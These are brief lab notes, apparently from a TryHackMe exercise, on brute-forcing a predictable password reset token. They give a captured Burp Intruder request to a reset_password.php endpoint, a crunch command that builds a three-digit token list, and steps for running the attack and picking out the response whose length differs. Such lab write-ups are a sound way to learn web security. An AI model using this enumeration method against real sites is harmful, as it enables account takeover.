- login into the page, get the email id.
- get the resent link
- go to burp suit
- into intruder:
- GET /labs/predictable_tokens/reset_password.php?token=138 HTTP/1.1
Host: enum.thm
Content-Length: 338
Connection: keep-alive

User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=cil5pf1clcildhsg3k6p3n293q
upgrade-Insecure-Requests: 1
-
- go to terminal: to generate a token
- crunch 3 3 -o otp.txt -t %%% -s 100 -e 200
- go to payload in burp n click on otp.txt file
- start attack
- look for the one with odd length
- click on it
